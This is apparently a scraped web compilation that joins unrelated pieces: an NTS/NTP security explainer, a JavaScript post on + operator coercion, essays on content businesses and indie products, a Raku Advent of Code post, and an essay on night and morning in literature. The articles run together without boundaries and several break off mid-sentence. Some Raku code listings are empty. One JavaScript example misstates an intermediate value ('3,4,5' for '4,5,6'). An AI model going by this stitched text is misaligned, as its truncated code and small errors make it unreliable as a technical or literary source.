<p>NTS uses modern cryptography to add an important layer of security to NTP. It prevents spoofing and MITM attacks by using authenticated packets. Amplification attacks are prevented by ensuring that request and response packets are always the same size.</p>
<p>NTS is really two protocols: a key establishment protocol, and NTP with some new Extension Fields. The reason for using two protocols is separation of concerns:</p>
<p>1. The seldom used key establishment on top of standard Transport Layer Security (TLS), and</p>
<p>2. The (already existing) low latency UDP-based time synchronisation path.</p>
<p>This means that the existing NTP functionality is the same as before, but the time data can now be authenticated.&nbsp;</p>
<h2><strong>The NTS authentication process</strong></h2>
<p>The authentication process consists of a key establishment and a timestamp request. The key exchange server typically runs on an ordinary computer, but the slim NTS-enabled NTP server is UDP-based and stateless. It can be served from anycast addresses and can be implemented at the hardware level. The NTP server’s state about each client is kept in the cookie provided by the client itself with each request. As there can potentially be hundreds of millions of clients, this is crucial for the smooth operation of a large-scale NTS service.</p>
<p>Since the cryptographic operations in the NTS path are symmetric it is both easier to implement them in hardware and to make them use constant time. This increases the accuracy of the time synchronisation and keeps the slower key exchange outside of the time synchronisation path.&nbsp;</p>
<p>NTS uses Authenticated Encryption using the Advanced Encryption Standard (AES), more specifically what is known as Synthetic Initialization Vector (RFC 5297). This is a block cipher mode of operation providing nonce-based,&nbsp;misuse-resistant authenticated encryption. Using AES-SIV enables the encryption processes described below to add integrity and origin authentication. The consequences for this at a hardware level will be discussed in an upcoming&nbsp;white paper.</p>
<p><span><strong>The key establishment</strong></span></p>
<p>The key establishment process works as follows: first, a client initiates a key establishment using the NTS-KE protocol embedded in TLS (see figure 1.)</p>

December 1, 2020 | https://javascript.christmas/2020/1 | <a href="https://web.archive.org/web/*/https://javascript.christmas/2020/1">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p><strong>JavaScript:</strong> <em>Do you know addition?</em></p>
<p><strong>Me:</strong> <em>Of course! I learned mathematics when I was seven, addition is fairly easy!</em></p>
<p><strong>JavaScript:</strong> <em>Do you really know addition? Please solve this equation</em></p>
<pre><code>true + [] = ?
</code></pre>
<p><strong>Me:</strong> <em>Eh?</em></p>
<p><strong>JavaScript:</strong> <em>Welcome to JavaScript addition!</em></p>
</section><article><section><p>If you have been working with JavaScript, you have probably seen a lot of usage with the <code>+</code> operator and discovered that the output is not necessarily what you expected.</p>
<p>The language supports using the <code>+</code> operator between (almost) all of the different data types - the results might therefore be confusing. In JavaScript, there is no compiler to hold your hand on your “addition journey”.</p>
<p><strong><em>The addition operator either performs string concatenation or numeric addition.</em></strong></p>
<p>With the rule above you should be able to understand all additions in JavaScript, but some of us need to see examples and explanations to fully understand the different scenarios.</p>
<p>First of all, remember that JavaScript performs the addition from left to right - evaluating parentheses first. This should be familiar with what you have learned in middle-grade mathematics.</p>
<div data-language="javascript"><pre><code>Step<span>-</span>by<span>-</span>step example
<span>1</span> <span>+</span> <span>2</span> <span>+</span> <span>(</span><span>3</span> <span>+</span> <span>4</span><span>)</span>
<span>1</span> <span>+</span> <span>2</span> <span>+</span> <span>7</span>
<span>3</span> <span>+</span> <span>7</span>
<span>10</span></code></pre></div>
<p>As the rule states - with two numeric elements, the output is a numeric value:</p>
<p><code>1 + 1 = 2</code></p>
<p>String concatenation is well known between different programming languages and is a  reasonable usage of the <code>+</code> operator:</p>
<p><code>"Santa" + " " + "Claus" = "Santa Claus"</code></p>
<p>So far, so good!</p>
<h2>The most important “rules” with <em>addition</em> in JavaScript</h2>
<ol>
<li>Adding a non-numeric value to a numeric value will try to convert the non-numeric value to a numeric value, if possible. If not, both are converted to strings.</li>
<li>Adding a non-numeric value to some value will convert both values to strings before adding them.</li>
</ol>
<p>So, what does that actually mean?</p>
<div data-language="javascript"><pre><code><span>1</span> <span>+</span> <span>"2"</span> <span>=</span> <span>"12"</span>
<span>1</span> <span>+</span> <span>1</span> <span>+</span> <span>"2"</span> <span>=</span> <span>"22"</span>
<span>1</span> <span>+</span> <span>"1"</span> <span>+</span> <span>"2"</span> <span>=</span> <span>"112"</span></code></pre></div>
<p>Confused? At least I am…</p>
<p>In the first line, a numeric and non-numeric value is added. Both are converted to strings before they are added</p>
<p><code>"1" + "2" = "12"</code></p>
<p>In the second line, there are both numeric addition and string concatenation. Remember, addition goes from left to right. </p>
<div data-language="javascript"><pre><code><span>1</span> <span>+</span> <span>1</span> <span>=</span> <span>2</span>
<span>2</span> <span>+</span> <span>"2"</span> <span>=</span> <span>"2"</span> <span>+</span> <span>"2"</span> <span>=</span> <span>"22"</span></code></pre></div>
<p>The third line only contains string concatenation.</p>
<p><code>"1" + "1" + "2" =&gt; "112"</code></p>
<p>Unfortunately, it doesn’t end here. Some other data types in JavaScript behave in a rather non-typical way when used for addition.</p>
<h2>Boolean</h2>
<p>What happens when you add something with a boolean value?</p>
<div data-language="javascript"><pre><code><span>1</span> <span>+</span> <span>true</span> <span>=</span> <span>2</span>
<span>1</span> <span>+</span> <span>false</span> <span>=</span> <span>1</span>
<span>true</span> <span>+</span> <span>true</span> <span>=</span> <span>2</span>
<span>false</span> <span>+</span> <span>false</span> <span>=</span> <span>0</span>
<span>"1"</span> <span>+</span> <span>true</span> <span>=</span> <span>"1true"</span>
<span>"1"</span> <span>+</span> <span>false</span> <span>=</span> <span>"1false"</span></code></pre></div>
<p>Boolean values can be converted to numeric values in JavaScript, and the result of the conversion is either 1 or 0.</p>

<p>Combining a boolean and a string value converts <code>true</code> to “true” and <code>false</code> to “false”.</p>
<h2>Objects, arrays and functions</h2>
<p>When one of the values in an addition is an object, array or function it will try to convert it to a primitive value.</p>
<ol>
<li>Execute the <code>valueOf()</code>-function and use that value if it is a primitive</li>
<li>Execute the <code>toString()</code>-function</li>
</ol>
<div data-language="javascript"><pre><code><span>const</span> me <span>=</span> <span>{</span> name<span>:</span> <span>"Charlie"</span><span>,</span> age<span>:</span> <span>34</span> <span>}</span>
me <span>+</span> <span>1</span> <span>=</span> <span>"[object Object]1"</span></code></pre></div>
<p>The default <code>valueOf()</code>-implementation is an empty object <code>{}</code> - which is not a primitive and it will try to convert it using <code>toString()</code>. The default <code>toString()</code>-value for an object is <code>"[object Object]"</code> - not very useful for addition. Unfortunately, I have seen this output many times during my time as a developer - it usually happens when I forget to specify the property of the object that should be part of the addition.</p>
<p>Sometimes, it might be handy to override the <code>valueOf()</code> or <code>toString()</code>-function and make it return something useful.</p>
<div data-language="javascript"><pre><code><span>const</span> me <span>=</span> <span>{</span> name<span>:</span> <span>"Charlie"</span><span>,</span> age<span>:</span> <span>34</span> <span>}</span>
me<span>.</span><span>valueOf</span> <span>=</span> <span>function</span> <span>(</span><span>)</span> <span>{</span> <span>return</span> <span>this</span><span>.</span>age <span>}</span>
me <span>+</span> <span>1</span> <span>=</span> <span>35</span></code></pre></div>
<p>The return type is now a numeric value and it will add 34 with 1 - which is 35.</p>
<p>The same can be done for a function or a class - for both <code>valueOf</code> and <code>toString</code>.</p>
<div data-language="javascript"><pre><code><span>function</span> <span>BekkEmployee</span><span>(</span><span>name<span>,</span> age</span><span>)</span> <span>{</span>
  <span>this</span><span>.</span>name <span>=</span> name<span>;</span>
  <span>this</span><span>.</span>age <span>=</span> age<span>;</span>
  <span>this</span><span>.</span><span>toString</span> <span>=</span> <span>function</span> <span>(</span><span>)</span> <span>{</span>
    <span>return</span> <span><span>`</span><span><span>${</span><span>this</span><span>.</span>name<span>}</span></span><span> is </span><span><span>${</span><span>this</span><span>.</span>age<span>}</span></span><span> years old</span><span>`</span></span><span>;</span>
  <span>}</span>
<span>}</span>

<span>new</span> <span>BekkEmployee</span><span>(</span><span>"Charlie"</span><span>,</span> <span>34</span><span>)</span> <span>+</span> <span>100</span> <span>=</span> <span>"Charlie is 34 years old100"</span></code></pre></div>
<p>For arrays, <code>valueOf</code> returns the array - which is not a primitive value. The output of its <code>toString()</code> is the content joined with a comma. An empty array is the same as an empty string.</p>
<div data-language="javascript"><pre><code><span>[</span><span>]</span> <span>+</span> <span>1</span> <span>=</span> <span>"1"</span>
<span>[</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>]</span> <span>+</span> <span>[</span><span>4</span><span>,</span> <span>5</span><span>,</span> <span>6</span><span>]</span> <span>=</span> <span>"1,2,3"</span> <span>+</span> <span>"3,4,5"</span> <span>=</span> <span>"1,2,34,5,6"</span></code></pre></div>
<p>Since you have been reading all along - here is a quiz for you:</p>
<p>PS: try to solve it before you check the browser console</p>
<div data-language="javascript"><pre><code><span>const</span> me <span>=</span> <span>{</span> name<span>:</span> <span>"Charlie"</span><span>,</span> age<span>:</span> <span>34</span> <span>}</span>
me<span>.</span><span>toString</span> <span>=</span> <span>function</span> <span>(</span><span>)</span> <span>{</span> <span>return</span> <span>this</span><span>.</span>age <span>}</span>

<span>true</span> <span>+</span> me <span>+</span> <span>65</span> <span>+</span> <span>[</span><span>2</span><span>]</span> <span>+</span> <span>false</span> <span>+</span> me <span>+</span> <span>"merry christmas"</span></code></pre></div>
<h2>Date</h2>
<p>All rules have some exceptions...</p>
<blockquote>
<p>All native ECMAScript objects except Date objects handle the absence of a hint as if the hint Number were given; Date objects handle the absence of a hint as if the hint String were given.</p>
</blockquote>
<p><code>Date.valueOf</code> returns a numeric type, but a date will be transformed into a string type when using the <code>+</code> operator.</p>
<div data-language="javascript"><pre><code><span>new</span> <span>Date</span><span>(</span><span>2020</span><span>,</span> <span>11</span><span>,</span> <span>1</span><span>)</span> <span>+</span> <span>12345</span> <span>=</span> <span>"Tue Dec 01 2020 00:00:00 GMT+0100 (Central European Standard Time)12345"</span>
<span>new</span> <span>Date</span><span>(</span><span>2020</span><span>,</span> <span>11</span><span>,</span> <span>1</span><span>)</span> <span>+</span> <span>"12345"</span> <span>=</span> <span>"Tue Dec 01 2020 00:00:00 GMT+0100 (Central European Standard Time)12345"</span>

<span>new</span> <span>Date</span><span>(</span><span>2020</span><span>,</span> <span>11</span><span>,</span> <span>1</span><span>)</span><span>.</span><span>toString</span><span>(</span><span>)</span> <span>=</span> <span>"Tue Dec 01 2020 00:00:00 GMT+0100 (Central European Standard Time)"</span>
<span>new</span> <span>Date</span><span>(</span><span>2020</span><span>,</span> <span>11</span><span>,</span> <span>1</span><span>)</span><span>.</span><span>valueOf</span><span>(</span><span>)</span> <span>=</span> <span>1606777200000</span></code></pre></div>
<h2>Weirdos</h2>
<p>Now that you know the important rules of addition, there are some data types you also should be aware of:</p>
<div data-language="javascript"><pre><code><span>undefined</span> <span>+</span> <span>1</span> <span>=</span> <span>NaN</span> 
<span>undefined</span> <span>+</span> <span>"1"</span> <span>=</span> <span>"undefined1"</span>
<span>null</span> <span>+</span> <span>1</span> <span>=</span> <span>1</span> 
<span>null</span> <span>+</span> <span>"1"</span> <span>=</span> <span>"null1"</span>
<span>NaN</span> <span>+</span> <span>1</span> <span>=</span> <span>NaN</span>
<span>NaN</span> <span>+</span> <span>"1"</span> <span>=</span> <span>"NaN1"</span>
<span>Symbol</span><span>(</span><span>1</span><span>)</span> <span>+</span> <span>1</span> 
<span>BigInt</span><span>(</span><span>1</span><span>)</span> <span>+</span> <span>1</span> 
<span>BigInt</span><span>(</span><span>1</span><span>)</span> <span>+</span> <span>"2"</span> <span>=</span> <span>"12"</span></code></pre></div>
<p>As you have read, addition is not as easy as we know from mathematics. However, if you remember some of the conversion rules above you might save yourself from some headaches in the future!</p></section></article></div>]]>

            </div><div id="developer-content-businesses-examples">
                <h2>Examples</h2>
                
                    <h4><a href="https://nomadlist.com/" target="_blank">NomadList</a><br></h4><p>Trying to decide which city to move to next? NomadList gives you a whole lot of filterable &amp; sortable information about large cities around the world. Easily compare cost of living, internet speeds, air quality, etc. This example is monetized through ads, premium features, a paid community, and a related job board.</p><h4><a href="https://www.keyvalues.com/" target="_blank">KeyValues</a></h4><p>Trying to find the ideal engineering team to work with? KeyValues lets you discover companies based on the values they consider to be important. For example, if you're interested in working at a company that promotes from within and is design driven, you can easily find companies that match your values with KeyValues. This example is monetized&nbsp;by charging companies to have their profile created and listed on the site.</p><h4><a href="https://pageflows.com/" target="_blank">Page Flows</a></h4><p>Designing a key user flow for your product (onboarding, upgrading, inviting friends etc)? Page Flows lets you see how popular products handle those user flows so you can see what you've missed or what could be improved. This example (my very own) makes money by charging people to access the library of user flow recordings.</p><h4><a href="https://www.nerdwallet.com/" target="_blank">NerdWallet</a></h4><p>Not sure which credit card you should choose? NerdWallet is a huge business that's all about helping you choose the right financial products (credit cards, insurance etc). It makes money from affiliate sales and lead generation (when someone choses a financial product through NerdWallet, the chosen financial institution pays NerdWallet).</p><h4><a href="https://theorg.com/" target="_blank">The Org</a></h4><p>Trying to figure out how a team is structured so you have a better idea of who to contact when trying to pitch a product or make a sale? Find that companies organization chart on The Org. I have no idea how this site is monetized, but I'm certain that people who work in sales would be happy to pay for this type of information about their target customers.</p><h4><a href="https://www.getcyberleads.com/" target="_blank">Cyberleads</a></h4><p>Running a web design or service based agency of some sort and spending a lot of time looking for the ideal potential customers?

            </div><div id="developer-content-businesses-content-business-vs-saas">
                <h2>RaaS vs SaaS</h2>
                
                    <p>Now that you understand what I mean when I talk about research-as-a-service (RaaS), I'll explain why I think they're a solid alternative for developers who want to build small lifestyle businesses.</p><h4><span>Quick to get started</span></h4><p>It is possible to build a minimal SaaS proof of concept or even start selling without building anything at all, but for most developers, it's super tempting to jump right into the code and get stuck in a cycle of adding features before getting anything in front of potential customers.</p><p>That's less of a risk when building content products as there's only so much coding you can justify when the core of your product is data. NomadList, for example, started out as a Google Sheet. You can quickly test out RaaS concepts using spreadsheets, Tweets, videos etc.</p><p>You're probably already researching something at the moment. Just compile the results of that research onto a Google Doc/Sheet and share it with people who might find it useful.</p><h4><span>Uptime matters less</span><br></h4><p>If you are fortunate enough to ship a SaaS that gets traction, keeping it up and running will be important, especially if customers are relying on it for business critical tasks.</p><p>If you build some sort of content product that becomes popular, it's way easier to keep it online and even if it does go down for a couple of hours, it's probably not a big issue.</p><h4>Some marketing is built into the product</h4><p>When people search for cities with fast internet, NomadList is in the results. If they search for which credit card is best for self employed people, NerdWallet is in the results. People looking for Apple's org chart will come across The Org. You get the point.</p><p>These types of products have some built-in marketing, whereas with most SaaS companies, you need to work on the product as well as on marketing.</p><h4>Developers can flex their skills and creativity</h4><p>As developers, it's way easier for you to build more creative forms of content then it is for less technical people using off-the-shelf tools like Wordpress.</p><p>This can be helpful for generating content (scraping, for example), creating better experiences (better ways to sort/filter, video players with niche specific features, etc) as well as for marketing/growth.</p><p>For example, it would be fairly trivial for you to for you to use your data to automatically generate a bunch of useful pages that would expand your long-tail search footprint.</p><p>If your&nbsp;site was for helping people decide which laptop to buy, you could use the same data set to generate pages for: <i>"best laptops for video editing, best laptops for browsing, best laptops for photoshop, cheapest laptops for photoshop, x laptop vs y laptop, alternative to y laptop, how big is x laptop etc etc."</i></p><h4>Compounding</h4><p>Content products compound over time. The more relevant research content you add, the more valuable it becomes and the harder it is for people to compete with you.</p>
                
            </div><div id="developer-content-businesses-section-31">
                
                
                    <p>There are, of course, some areas where SaaS really shines, but I'm trying to make the point that developers who are interested in starting a businesses should consider RaaS as a solid option and should keep an eye out for RaaS opportunities.</p><p>When you find yourself opening a billion tabs while spending days trying to research something, there's likely an opportunity to make that research process easier for others.</p><p>Personally, I'm putting my money where my mouth is and will be focussing on building, launching, and growing RaaS products for the foreseeable.&nbsp;</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<div><p>I’ve been part of the internet startup scene for a while. There are so many different camps: the bootstrappers, the VC-backed tech-bros, the crypto “investors”, the people marketing their courses on marketing courses, the newsletter gurus, the micro-saas homeboys. The list goes on.</p>
<p>Each of these groups have their own, unique views on building companies and products. Some are moonshots, others are sustainable “grow-slowly” types, and each has its own subset of hard-core, flame-war inducing followers. Ah, the internet is a beautiful, terrible, magical, ghastly, colourful place.</p>
<p>I’ve been associated with, and in some cases, been a part of a few of these various subcultures. After working at a VC backed startup, I went the bootstrapped route (popularised by the IndieHackers movement) with my own product. It was an interesting ride, but was still rife with the Marketing Course Joes who just made $3000 last week with their “How to market no-code apps” course, as well as the Hustle Boys with their Twitter feeds full of “Work like no-one works today, so you can live like no-one lives tomorrow. #entrepreneur”. Neither of these resonated with me.</p>
<p>I have found my own analogy/ideology. My product is my garden.</p>
<p>During the early days of lockdown, my girlfriend got deep into gardening. She would spend hours nurturing her tomato plants, weeding, watering, puttering about. She would spend afternoons reading articles on permaculture, figuring out which plants grew well alongside other plants. Lavender with tomatoes kept the pests away, slight shade for the granadilla vine, some water, but not too much for the root vegetables. It was lovely to watch her coax tasty and nutritious food individually out of the ground. I can’t imagine full-scale farming being nearly as enjoyable.</p>
<p>That’s what I want from my products. I want to putter about, feel connected to the process, and have fun doing so. I want to make things that don’t scale. To see people tuck into them and enjoy them as people, not as stats. I’ve done this fairly successfully with <a href="https://justsketch.me/">JustSketchMe</a>. We have a small, diverse, and amazing community of artists and illustrators making awesome things. I’m trying to build a similar product with <a href="https://bearblog.dev/">Bear Blog</a>. Something niche but valuable. Something I can spend time on because I want to.</p>
<p>Being able to talk to, and interact with the people using my tools is fulfilling. Spending time meticulously improving subtle aspects of the product is enjoyable.</p>
<p>Obviously, to do this a product has to reach a basic threshold of profitability. This will differ depending on where you are. I live in Cape Town, South Africa where the cost of living is low (compared to the US and EU). I reached basic profitability, matching an average developer salary here, about 10 months ago, and since then I’ve been improving my projects. Not to grow at all cost, but to ensure that people using the tool have an ever-improving experience.</p>
<p>This is my garden, and I intend to putter.</p>

	<div>
		<p>Now that it’s December, it’s time for two of my favorite traditions from the tech world: the <a href="https://raku-advent.blog/">Raku Advent Calendar</a> and <a href="https://adventofcode.com/2020/about">Advent of Code</a>.  These two holiday traditions have a fair amount in common – they both run from December 1 through Christmas, and both involve releasing something new every day during the event.  Specifically, the Raku Advent Calendar releases a new blog post about the <a href="https://www.raku.org/">Raku programming language</a>, while Advent of Code releases a new programming challenge – which can be solved in any language.</p>
<p>(In this post, I’ll be referring to Advent of Code as “AoC” – not to be confused with the American politician <a href="https://en.wikipedia.org/wiki/Alexandria_Ocasio-Cortez">AOC</a> who, to the best of my knowledge, does not program in Raku.)</p>
<p>For me, Raku and AoC are the chocolate and peanut butter of tech Advent season: each is great on its own, but they’re even better in combination.  If your only goal is to solve AoC challenges, Raku is a great language to use; on the other hand, if your only goal is to learn Raku, then solving AoC challenges is a great way to do so.  This post will explain how Raku and AoC are such a good fit and then provide some resources to help us all get started solving AoC challenges.</p>

<p>Since Raku is a relatively new programming language, at least some of you may not be familiar with it or why it’s worth learning.  Raku is <a href="https://www.reddit.com/r/rakulang/comments/ixo408/how_would_you_describe_raku_in_one_sentence/">notoriously hard</a> to pin down in a single sentence, but here’s my attempt:</p>
<blockquote><p><strong>Raku</strong> A concise, expressive, aggressively multiparadigm language with strongly inferred types, built-in concurrency, rich metaprogramming, and best-in-class string processing and pattern matching.</p></blockquote>
<p>What this means in practice is that I find myself reaching for Raku increasingly often.  When faced with pretty much any problem, I keep concluding that Raku is the language that will let me solve it in the clearest, fastest, and most elegant way possible.  (The one exception is if solving my problem demands the raw speed or low resource use of a compiled language.  But even in that relatively rare case, I’d probably write the performance-critical sections of my code in Rust and the rest in Raku, taking advantage of how <a href="https://raku-advent.blog/2019/12/13/day-4-a-little-rr/">well the two languages play together</a>.)</p>
<p>That’s not to say that Raku is a language that tries to be all things to all people.  In fact, Raku has a rare, laser-like focus on individual productivity and is willing to trade off some standard enterprise/large group features to achieve that goal, as I’ve previously discussed at length (<a href="https://www.codesections.com/blog/raku-manifesto/">part 1</a>, <a href="https://www.codesections.com/blog/raku-manifesto-2/">part 2</a>, <a href="https://www.codesections.com/blog/raku-manifesto-3/">part 3</a>).  But, even setting those big-picture ideas aside, Raku is a language that’s full of interesting ideas.  If those ideas are even half as good as I believe them to be, then Raku is a language you’ll want in your toolbelt.</p>

<p>I believe that Raku is a good fit for solving many different problems, but it’s definitely an <em>excellent</em> fit for Advent of Code challenges.  To explain why, I’ll walk through what we’d want out of an ideal AoC language.  Then I’ll present a Raku solution to last year’s first AoC challenge and compare it to our ideal.  (Spoiler: they’re really similar!)</p>
<p>When thinking about the ideal AoC language, the first feature of AoC that comes to mind is that it’s a series of small, largely self-contained puzzles rather than one large project.  This suggests that the ideal language would be <strong>concise and low-boilerplate</strong>.  It’s annoying but bearable to deal with many lines of boilerplate when setting up a large project, but it’d be far worse to do so repeatedly on each day of AoC.  And, since we’ll be sharing our code, keeping it concise will help others see our logic without being distracted by housekeeping details.</p>
<p>We can be a bit more specific: the AoC challenges typically provide textual input and look for textual output; they also usually provide several test cases that can help to craft a working solution.  Thus, in addition to being concise in general, our ideal language should offer low-boilerplate solutions for <strong>scripting and testing</strong>.</p>
<p>Perhaps the most notable (and certainly most fun!) feature of AoC is that it’s community driven and educational: thousands of programmers are all solving the same puzzles on more or less the same schedule, and are then posting their solutions to the <a href="https://www.reddit.com/r/adventofcode/">Advent of Code subreddit</a>.  It’s very common to learn as much or more from reading other solutions – including ones in different languages – as you do from solving the challenge yourself.  This means that our ideal language should be <strong>readable and elegant</strong>, even for people without much experience in the language.</p>
<p>Of course, while it’s great to be able to write code that people unfamiliar with the language can appreciate, much of our teaching and learning will come from comparing our solutions to other solutions in the same language.  After all, different solutions in the same language will often show approaches that make different tradeoffs and can help expand our programming toolset.  Or at least that happens if different solutions in our language are, well, <em>different</em>: if our language pushes everyone towards a single, obvious solution, then there will be much less room for that sort of learning.  So our ideal language should offer <strong>more than one way</strong> to solve any particular challenge.</p>
<p>I’m sure I could go on, but it seems like we have a pretty good list.  To sum up, we’re looking for a language that’s concise and low-boilerplate, especially for scripting and testing, and that allows for multiple different readable and elegant solutions to each challenge.  (Note that this list is about finding the best language for learning from and enjoying AoC.  If your goal is to place highly on the AoC leaderboard, then Raku’s excellent string processing features would still make it a <a href="https://blog.vero.site/post/advent-leaderboard#get-comfortable-with-your-language-standard-library-and-editor">good fit</a>.  But, realistically, if that’s your goal, you should pick whatever language you know best.)</p>
<p>Now that we know what we’d want in an ideal language, let’s take a look at a Raku solution to last year’s first challenge.</p>
<h3>AoC 2019 day 1 in Raku</h3>
<p>You can read the <a href="https://adventofcode.com/2019/day/1">full problem description</a> for all the details, but the short version is that this challenge asks us to make a few different calculations about the fuel required to launch a spaceship based on its mass.  Specifically, in Part 1 we are told:</p>
<blockquote><p>to find the fuel required for a module, take its mass, divide by three, round down, and subtract 2.</p></blockquote>
<p>Because Raku has an <a href="https://docs.raku.org/language/operators#index-entry-Integer_division_operator">integer division operator</a>, this is almost trivially easy:</p>
<pre id="advent-code-df24120f-e53b-43d4-ae09-2cf83537f27d"><table>

<tbody>

<tr>

<td id="file-df24120f-e53b-43d4-ae09-2cf83537f27d-p6-L1"></td>


<td id="file-df24120f-e53b-43d4-ae09-2cf83537f27d-p6-LC1"><span>sub</span> fuel($mass) { <span>+</span>$mass <span>div</span> <span>3</span> <span>-</span> <span>2</span> }</td>

</tr>

</tbody>

</table>
</pre>
<p>Part 2 asks us to perform a similar calculation, but this time to take into account the extra mass added by the fuel we’re adding:</p>
<blockquote><p>Fuel itself requires fuel just like a module – take its mass, divide by three, round down, and subtract 2. However, that fuel also requires fuel, and that fuel requires fuel, and so on.</p></blockquote>
<p>To solve this part, we can use our <code>fuel</code> function from Part 1 to calculate how much fuel we need, and then add our initial result to the amount of fuel we need for the new mass.</p>
<pre id="advent-code-624b81de-c473-4ed9-bf9e-ac9f982a564d"><table>
































<tbody>































<tr>
































<td id="file-624b81de-c473-4ed9-bf9e-ac9f982a564d-p6-L1"></td>
































































<td id="file-624b81de-c473-4ed9-bf9e-ac9f982a564d-p6-LC1"><span>multi</span> total-fuel($mass) { fuel($mass)<span>.</span>&amp;{<span>$_</span> <span>+</span> <span>.</span>&amp;total-fuel} }</td>
































</tr>
































</tbody>































</table>
</pre>
<p>Part 2 also tells us:</p>
<blockquote><p>Any mass that would require negative fuel should instead be treated as if it requires zero fuel.</p></blockquote>
<p>Again, Raku offers a powerful feature that makes this simple: in this case, the powerful feature is Raku’s ability to pattern match against run-time values in <a href="https://docs.raku.org/type/Signature#index-entry-where_clause">function signatures</a>.</p>
<pre id="advent-code-b3191b98-d3f9-4dae-a6da-56dc04d34ec7"><table>

<td id="file-b3191b98-d3f9-4dae-a6da-56dc04d34ec7-p6-L1"></td>

</tr>

</table>
</pre>
<p>With those three lines, we’ve essentially solved the challenge.  Of course, we want to be able to perform this calculation not just on single numbers but on our entire input (which, for this challenge, takes the form of a text file with a different number on each line).  We also want our script to be executable and to expose a CLI with a user-friendly description and <code>--help</code> text.  This CLI should allow the user to select whether our script solves Part 1 or Part 2 of the challenge.</p>
<p>Fortunately, Raku lets us add all of these niceties with a grand total of three additional lines of code and a shebang comment.  This gets our full solution so far to the following:</p>

<p>(The comments embedded in lines 2 and 3 produce the <code>--help</code> documentation.)</p>
<p>The challenge also provides 7 test cases that we should probably include.  When working on a larger Raku project, the <a href="https://docs.raku.org/language/testing">standard approach</a> would be to split our tests out into a separate file.  But we’re <a href="https://www.perl.com/pub/2007/12/06/soto-11.html/">going scripting</a> and it would be a shame to give up our single-file simplicity.  So, instead of using a separate file, we’ll use a technique that I <a href="https://www.codesections.com/blog/raku-unit-testing-with-conditional-compilation/">previously blogged about</a> to use Raku’s conditional compilation to include our tests in a single file without executing them every time we run our script.</p>
<p>Using that technique, here’s what we get for our final code, including tests:</p>

<h3>Comparing Raku to the ideal AoC language</h3>
<p>So, how does Raku do on the metrics we came up with earlier?  Well, in terms of being <strong>concise and low-boilerplate</strong>, this code seems to do reasonably well.  True, it’s far from <em>maximally</em> concise; it’s about 7 times longer than the <a href="https://fosstodon.org/@codesections/103233204678110012">solution …</a></p></div></article></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><blockquote><p>The night is dark and full of terrors.</p><p><em>— Melisandre, </em>Game of Thrones<em><br></em></p></blockquote><p>How many times have you read something like this in some story or a novel? Or something along the lines of: <em>the evening gloom was gathering?</em></p><p>I am sure it isn’t a rare occurrence. Night, day, morning, evening, they seem ordinary to us. We see the sun rising and setting daily and live through the time of noon when everything is active and chaotic. Similarly, we spend the time of night when there is silence and peace. They are so obvious and ordinary that we don't even notice them. But if you look closer, there are layers upon layers of complexities of meanings and emotions hidden in them that sometime we cannot even comprehend.</p><p>Have you ever noticed how your mood changes during different hours of the day? The change is subtle. You may say that this change is because of the job I do, or it is due to the daily chores, etc. But observe yourself one day when you are at home, idle and unoccupied. You will notice that the changes in the mood still occur. Of course, these changes are subjective because some feel happy in the morning and some feel gloomy. For some, night brings imperceptible loneliness and darkness of mood, for others, it is a time of euphoria and liberty.</p><p>These shifts of mood are quite invisible when they happen and we only notice them when they are in full swing. It is these feelings that artists and creators bring out with the help of metaphors to create settings. For example, the night is a symbol of terror in a special context.</p><blockquote><p>Men fear death as children fear to go in the dark; and as that natural fear in children is increased by tales, so is the other.</p><p><em>— </em>Sir Francis Bacon</p></blockquote><p>The darkness of the night is a perfect setting for any piece of art depicting horror. The darkness symbolizes the unknown dark crevices in the infinities of the universe. Along with that, it portrays the unknown inside us; the unconscious and the demons sleeping within, who stir when we are in the dark. This primordial fear is deep inside all of us. Children and sensitive people feel it and are always fearful of the darkness, even under the safest circumstances. This horror is perfectly canonized in the poem <em>The Raven</em> by Edgar Allan Poe:</p><blockquote><p><em>Deep into that darkness peering, long I stood there wondering, fearing,<br></em><em>Doubting, dreaming dreams no mortal ever dared to dream before;<br></em><em>But the silence was unbroken, and the stillness gave no token,<br></em><em>And the only word there spoken was the whispered word, "Lenore?"<br></em><em>This I </em><em>whispered,</em><em> and an echo murmured back the word,<br>"Lenore!"—<br></em><em>Merely this and nothing more.</em></p></blockquote><p>Night is also used as the time of peace, when we reflect on the chaos and business of the day. The time of union between lovers long separated. Night is the time when our feelings and thoughts are calm like water and we are true to ourselves. It is also a time of transcendence especially the time of dawn. In many religious traditions, such as Islam and Sikhism, dawn is the time of meditation and prayer. For artists too, this is a special time. Some artists are deeply affected by night and what it hides. They are more comfortable with producing art in the late hours when everything is silent and asleep.</p><p>In general, the night symbolizes the unknown for us. We fear the unknown and try to hide from it, in walls and houses. But for natural adventurers and people who are curious, night time symbolizes opportunity and endeavor because surely there is much hidden in the unknown that is very useful for us.</p><p>The night ends and the morning starts. This is a time of change. Silence changes into noise. Inactivity changes into activity. For most people morning brings freshness and a new start where they can try something new. For others, mornings are full of anxiety and tension as they look at the whole day as a foreboding for something bad to come. It is because they are tired of life and its mundaneness or maybe it is something more complex.</p><p>Some artists use morning imagery for depicting beauty and freshness of the world or their love. For example,</p><blockquote><p>But soft! What light through yonder window breaks?<br>It is the east, and Juliet is the sun.<br>Arise, fair sun, and kill the envious moon,<br>Who is already sick and pale with grief;</p><p><em>— Romeo and Juliet</em>, William Shakespeare</p></blockquote><p>Moreover, morning wind is a classical metaphor in Persian and Urdu poetry. Poets use the scene of morning to announce some new event or a fresh idea.</p><blockquote><p>The morning wind spreads its fresh smell.<br>We must get up to take that in,<br>that wind that lets us live.<br>Breathe, before it's gone.</p><p><em>— </em>Rumi</p></blockquote><p>Evening is a time of work done and a day gone. A time forever lost to memory and history. In poetry, it is the time of melancholy and sadness. Robert Frost's famous poem takes place in the dark hours of the evening:</p><blockquote><p>The woods are lovely, dark and deep,<br>But I have promises to keep,<br>And miles to go before I sleep,<br>And miles to go before I sleep.</p></blockquote><p>Charles Baudelaire's, <em>The Sunset of Romanticism</em> is another example. It uses the sunset as a metaphor for the end of the Age of Romanticism in Europe.<strong>&nbsp;</strong></p><p>The evening time is most often associated with sadness and loss and only a few have tried to depict the evening atmosphere as something hopeful. It can be a hopeful setting in an urban environment where the nightlife starts with sunset but in a more natural environment or rural settings, evening is always a time of deep melancholy thoughts and going 